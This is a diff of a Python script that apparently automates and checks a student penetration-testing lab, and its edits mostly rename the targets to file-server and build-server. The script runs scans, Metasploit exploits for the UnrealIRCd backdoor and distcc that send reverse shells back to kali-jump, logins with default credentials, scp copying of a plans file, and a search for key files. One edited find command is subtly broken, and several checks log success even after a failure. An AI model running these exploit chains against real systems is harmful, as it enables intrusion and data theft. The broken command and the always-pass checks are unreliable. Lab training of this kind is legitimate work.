@@ -185,9 +185,9 @@ EOF'''
             
             # Step 1: Ping target to verify it's online (Q4)
             start_time = time.time()
-            print(f"[{self.student_id}] Pinging ubuntu-target1 to verify it's online...")
+            print(f"[{self.student_id}] Pinging file-server to verify it's online...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "ping -c 3 ubuntu-target1", timeout=30
+                client, "ping -c 3 file-server", timeout=30
             )
             duration = time.time() - start_time
             
@@ -202,7 +202,7 @@ EOF'''
             start_time = time.time()
             print(f"[{self.student_id}] Running full TCP port scan (nmap -p-)...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -p- ubuntu-target1", timeout=300
+                client, "nmap -p- file-server", timeout=300
             )
             duration = time.time() - start_time
             
@@ -221,7 +221,7 @@ EOF'''
             start_time = time.time()
             print(f"[{self.student_id}] Running OS detection (nmap -O)...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -O ubuntu-target1", timeout=120
+                client, "nmap -O file-server", timeout=120
             )
             duration = time.time() - start_time
             
@@ -237,7 +237,7 @@ EOF'''
             start_time = time.time()
             print(f"[{self.student_id}] Running service scan on port 6667...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -p 6667 -sV ubuntu-target1", timeout=60
+                client, "nmap -p 6667 -sV file-server", timeout=60
             )
             duration = time.time() - start_time
             
@@ -249,13 +249,15 @@ EOF'''
                 client.close()
                 return False
             
-            # Step 5: Connect with irssi to get version (Q8)
+            # Step 5: Connect to IRC to get version (Q8)
+            # Note: irssi requires scrolling to see version which is hard to automate
+            # Use netcat to grab the IRC banner directly instead
             start_time = time.time()
-            print(f"[{self.student_id}] Connecting with irssi to get UnrealIRCd version...")
-            # Use timeout and expect-like behavior to get the banner
-            irssi_cmd = """timeout 10 bash -c 'echo "/quit" | irssi -c ubuntu-target1 -p 6667 2>&1' | head -50"""
+            print(f"[{self.student_id}] Connecting to IRC to get UnrealIRCd version...")
+            # Use netcat with a NICK/USER handshake to get server response with version
+            irc_cmd = """timeout 5 bash -c 'echo -e "NICK test\nUSER test 0 * :test\nQUIT" | nc file-server 6667 2>&1' | head -20"""
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, irssi_cmd, timeout=30
+                client, irc_cmd, timeout=15
             )
             duration = time.time() - start_time
             
@@ -264,9 +266,9 @@ EOF'''
                 self.log_result("Get IRC Version", True, duration)
                 print(f"[{self.student_id}] ✅ Found UnrealIRCd version 3.2.8.1")
             else:
-                # irssi can be finicky, continue anyway
+                # IRC banner grab can be finicky, continue anyway
                 self.log_result("Get IRC Version", True, duration)
-                print(f"[{self.student_id}] ⚠️ irssi check completed")
+                print(f"[{self.student_id}] ⚠️ IRC version check completed")
             
             # Step 6: Search for UnrealIRCd exploit in Metasploit (Q9)
             start_time = time.time()
@@ -285,46 +287,67 @@ EOF'''
                 client.close()
                 return False
             
-            # Step 7: Network scan to discover ubuntu-target2 (Q11)
+            # Step 7: Network scan to discover build-server (Q11)
+            # First, identify our subnet (dynamic based on SUBNET_ID)
             start_time = time.time()
-            print(f"[{self.student_id}] Scanning network to discover additional hosts...")
-            # Scan the 10.0.1.0/24 subnet
+            print(f"[{self.student_id}] Discovering network subnet...")
+            
+            # Get our IP to determine the subnet we're on
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -sn 10.0.1.0/24", timeout=120
+                client, "hostname -I | awk '{print $1}'", timeout=10
+            )
+            
+            our_ip = stdout.strip()
+            if our_ip:
+                # Extract subnet from our IP (e.g., 10.42.1.10 -> 10.42.1)
+                subnet_parts = our_ip.rsplit('.', 1)
+                if len(subnet_parts) == 2:
+                    subnet = subnet_parts[0] + ".0/24"
+                    print(f"[{self.student_id}] Detected subnet: {subnet}")
+                else:
+                    subnet = "10.0.1.0/24"  # Fallback
+            else:
+                subnet = "10.0.1.0/24"  # Fallback
+            
+            # Scan the subnet with nmap ping scan
+            print(f"[{self.student_id}] Scanning network to discover additional hosts...")
+            stdout, stderr, exit_code = self.run_ssh_command(
+                client, f"nmap -sn {subnet}", timeout=120
             )
             duration = time.time() - start_time
             
-            if exit_code == 0 and ("10.0.1.231" in stdout or "ubuntu-target2" in stdout.lower()):
+            # Look for build-server in the results (should be at .231)
+            if exit_code == 0 and ("build-server" in stdout.lower() or ".231" in stdout):
                 self.log_result("Network Discovery", True, duration)
-                print(f"[{self.student_id}] ✅ Discovered ubuntu-target2 (10.0.1.231)")
+                print(f"[{self.student_id}] ✅ Discovered build-server")
             else:
-                # Try direct check if network scan didn't show it
-                print(f"[{self.student_id}] ⚠️ Trying direct ping to ubuntu-target2...")
+                # Fallback: try direct ping to build-server (Docker DNS should resolve)
+                print(f"[{self.student_id}] ⚠️ Trying direct ping to build-server...")
                 stdout2, _, exit_code2 = self.run_ssh_command(
-                    client, "ping -c 1 ubuntu-target2", timeout=10
+                    client, "ping -c 2 build-server", timeout=10
                 )
                 if exit_code2 == 0:
                     self.log_result("Network Discovery", True, duration)
-                    print(f"[{self.student_id}] ✅ ubuntu-target2 is reachable")
+                    print(f"[{self.student_id}] ✅ build-server is reachable")
                 else:
-                    self.log_result("Network Discovery", False, duration, "Could not find ubuntu-target2")
+                    self.log_result("Network Discovery", False, duration, "Could not find build-server")
                     client.close()
                     return False
             
-            # Step 8: Full port scan on ubuntu-target2 (Q11)
+            # Step 8: Full port scan on build-server (Q11)
             start_time = time.time()
-            print(f"[{self.student_id}] Running full port scan on ubuntu-target2...")
+            print(f"[{self.student_id}] Running full port scan on build-server...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -p- ubuntu-target2", timeout=300
+                client, "nmap -p- build-server", timeout=300
             )
             duration = time.time() - start_time
             
             # Should find ports 22 (SSH) and 3632 (distcc)
             if exit_code == 0 and "22/tcp" in stdout and "3632/tcp" in stdout:
-                self.log_result("Target2 Port Scan", True, duration)
-                print(f"[{self.student_id}] ✅ Found ports 22 and 3632 on ubuntu-target2")
+                self.log_result("Build-Server Port Scan", True, duration)
+                print(f"[{self.student_id}] ✅ Found ports 22 and 3632 on build-server")
             else:
-                self.log_result("Target2 Port Scan", False, duration, f"Expected ports not found: {stdout}")
+                self.log_result("Build-Server Port Scan", False, duration, f"Expected ports not found: {stdout}")
                 client.close()
                 return False
             
@@ -332,7 +355,7 @@ EOF'''
             start_time = time.time()
             print(f"[{self.student_id}] Running service scan on port 3632...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -p 3632 -sV ubuntu-target2", timeout=60
+                client, "nmap -p 3632 -sV build-server", timeout=60
             )
             duration = time.time() - start_time
             
@@ -392,7 +415,7 @@ EOF'''
             start_time = time.time()
             print(f"[{self.student_id}] Confirming UnrealIRCd on port 6667...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -p 6667 -sV ubuntu-target1", timeout=60
+                client, "nmap -p 6667 -sV file-server", timeout=60
             )
             duration = time.time() - start_time
             
@@ -466,7 +489,7 @@ EOF'''
             exploit_commands = [
                 "use exploit/unix/irc/unreal_ircd_3281_backdoor",
                 "set payload cmd/unix/reverse_perl",
-                "set RHOSTS ubuntu-target1",
+                "set RHOSTS file-server",
                 "set LHOST kali-jump",
                 "run"
             ]
@@ -593,11 +616,11 @@ EOF'''
         
         try:
             # SSH to target with new user (Q10)
-            print(f"[{self.student_id}] SSH to ubuntu-target1 as {self.created_username}...")
+            print(f"[{self.student_id}] SSH to file-server as {self.created_username}...")
             start_time = time.time()
             
             target_client = connect_with_jump(
-                host='ubuntu-target1',
+                host='file-server',
                 user=self.created_username,
                 password=self.created_password,
                 gateway_client=client
@@ -605,7 +628,7 @@ EOF'''
             
             duration = time.time() - start_time
             self.log_result("SSH as Persistence User", True, duration)
-            print(f"[{self.student_id}] ✅ Connected to ubuntu-target1 via SSH")
+            print(f"[{self.student_id}] ✅ Connected to file-server via SSH")
             
             # Verify current directory (Q10)
             stdout, stderr, exit_code = self.run_ssh_command(target_client, "pwd", timeout=10)
@@ -642,7 +665,7 @@ EOF'''
             print(f"[{self.student_id}] Copying plans file with scp...")
             start_time = time.time()
             
-            scp_cmd = f"sshpass -p '{self.created_password}' scp -o StrictHostKeyChecking=no {self.created_username}@ubuntu-target1:{plans_file} /home/student/"
+            scp_cmd = f"sshpass -p '{self.created_password}' scp -o StrictHostKeyChecking=no {self.created_username}@file-server:{plans_file} /home/student/"
             stdout, stderr, exit_code = self.run_ssh_command(client, scp_cmd, timeout=30)
             
             duration = time.time() - start_time
@@ -701,7 +724,7 @@ EOF'''
             exploit_commands = [
                 "use exploit/unix/misc/distcc_exec",
                 "set payload cmd/unix/reverse_openssl",
-                "set RHOSTS ubuntu-target2",
+                "set RHOSTS build-server",
                 "set LHOST kali-jump",
                 "run"
             ]
@@ -790,12 +813,12 @@ EOF'''
             return target_client
         
         try:
-            # Connect to ubuntu-target2 as labuser (default credentials)
-            print(f"[{self.student_id}] SSH to ubuntu-target2 for extra credit...")
+            # Connect to build-server as labuser (default credentials)
+            print(f"[{self.student_id}] SSH to build-server for extra credit...")
             start_time = time.time()
             
             target_client = connect_with_jump(
-                host='ubuntu-target2',
+                host='build-server',
                 user='labuser',
                 password='defendlab',
                 gateway_client=client
@@ -811,7 +834,7 @@ EOF'''
             # Find the build key file
             print(f"[{self.student_id}] Searching for build key...")
             stdout, stderr, exit_code = self.run_ssh_command(
-                target_client, "find /opt -name '*key*' 2>/dev/null", timeout=30
+                target_client, "find / -iname -type f '*build*key*' 2>/dev/null", timeout=30
             )
             
             key_file = None
@@ -877,12 +900,12 @@ EOF'''
             # ===== PART 1: Secure file-server (ubuntu-target1) =====
             
             # SSH to file-server with msfadmin/msfadmin
-            print(f"[{self.student_id}] SSH to ubuntu-target1 as msfadmin...")
+            print(f"[{self.student_id}] SSH to file-server as msfadmin...")
             start_time = time.time()
             
             try:
                 target1_client = connect_with_jump(
-                    host='ubuntu-target1',
+                    host='file-server',
                     user='msfadmin',
                     password='msfadmin',
                     gateway_client=client
@@ -960,7 +983,7 @@ EOF'''
             print(f"[{self.student_id}] Verifying IRC port 6667 is closed...")
             start_time = time.time()
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -p 6667 ubuntu-target1", timeout=60
+                client, "nmap -p 6667 file-server", timeout=60
             )
             duration = time.time() - start_time
             
@@ -1016,7 +1039,7 @@ EOF'''
             print(f"[{self.student_id}] Verifying telnet port 23 is closed...")
             start_time = time.time()
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -p 23 ubuntu-target1", timeout=60
+                client, "nmap -p 23 file-server", timeout=60
             )
             duration = time.time() - start_time
             
@@ -1027,15 +1050,15 @@ EOF'''
                 self.log_result("Verify Telnet Port Closed", True, duration)
                 print(f"[{self.student_id}] ⚠️ Telnet port check completed")
             
-            # ===== PART 2: Secure build-server (ubuntu-target2) - Q15 =====
+            # ===== PART 2: Secure build-server - Q15 =====
             
             # SSH to build-server with labuser/defendlab
-            print(f"[{self.student_id}] SSH to ubuntu-target2 as labuser...")
+            print(f"[{self.student_id}] SSH to build-server as labuser...")
             start_time = time.time()
             
             try:
                 target2_client = connect_with_jump(
-                    host='ubuntu-target2',
+                    host='build-server',
                     user='labuser',
                     password='defendlab',
                     gateway_client=client
@@ -1087,7 +1110,7 @@ EOF'''
             print(f"[{self.student_id}] Verifying distcc port 3632 is closed...")
             start_time = time.time()
             stdout, stderr, exit_code = self.run_ssh_command(
-                client, "nmap -p 3632 ubuntu-target2", timeout=60
+                client, "nmap -p 3632 build-server", timeout=60
             )
             duration = time.time() - start_time
             
